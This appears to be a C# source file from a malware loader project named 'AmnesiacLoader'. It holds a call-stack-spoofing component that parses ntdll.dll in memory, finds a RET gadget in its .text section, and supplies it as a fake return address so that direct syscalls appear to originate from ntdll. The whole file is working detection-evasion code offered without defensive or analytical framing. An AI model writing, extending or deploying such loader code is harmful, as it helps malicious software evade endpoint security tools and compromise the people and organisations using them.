// AmnesiacLoader — Call Stack Gadget Provider
// Scans ntdll.dll .text section for RET (0xC3) bytes preceded by common safe suffixes.
// GetGadget() returns a stable ntdll address used by SyscallResolver.AllocateStub()
// to install a fake return frame so the syscall appears to originate from ntdll code.

using System;
using System.Runtime.InteropServices;

namespace AmnesiacLoader
{
    public class CallStack
    {
        static IntPtr _gadget = IntPtr.Zero;

        [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string name);

        // Returns address of a RET gadget inside ntdll .text section.
        // Inserted as fake return address in syscall stubs (one spoofed frame).
        public static IntPtr GetGadget()
        {
            if (_gadget != IntPtr.Zero) return _gadget;
            _gadget = FindGadget();
            return _gadget;
        }

        internal static void SpoofFrames()
        {
            // Frame insertion is handled at stub-allocation time in SyscallResolver.AllocateStub().
            // The stub pushes GetGadget() as the return address before the syscall instruction.
        }

        static unsafe IntPtr FindGadget()
        {
            IntPtr ntdllBase = GetModuleHandle("ntdll.dll");
            if (ntdllBase == IntPtr.Zero) return IntPtr.Zero;

            byte* basePtr = (byte*)ntdllBase.ToPointer();

            // Parse PE to find .text section
            int    peOffset    = *(int*)(basePtr + 0x3C);
            ushort numSections = *(ushort*)(basePtr + peOffset + 0x06);
            ushort optHdrSize  = *(ushort*)(basePtr + peOffset + 0x14);
            byte*  secTable    = basePtr + peOffset + 4 + 20 + optHdrSize;

            for (int s = 0; s < numSections; s++)
            {
                byte*  sec  = secTable + s * 40;
                string name = Marshal.PtrToStringAnsi(new IntPtr(sec), 8);
                if (name == null || !name.StartsWith(".text")) continue;

                uint  va       = *(uint*)(sec + 0x0C);
                uint  vsz      = *(uint*)(sec + 0x10);
                byte* start    = basePtr + va;
                byte* end      = start + vsz - 2;

                // Look for C3 (RET) preceded by: 90 (NOP), 5D (POP RBP), 5B (POP RBX),
                // 5F (POP RDI), 5E (POP RSI), C3 (back-to-back RET)
                for (byte* p = start + 1; p < end; p++)
                {
                    if (*p != 0xC3) continue;
                    byte prev = *(p - 1);
                    if (prev == 0x90 || prev == 0x5D || prev == 0x5B ||
                        prev == 0x5F || prev == 0x5E || prev == 0xC3)
                    {
                        return new IntPtr(p);
                    }
                }
                break;
            }

            // Fallback: ntdll base + 0x1000 (still inside ntdll)
            return new IntPtr(basePtr + 0x1000);
        }
    }
}
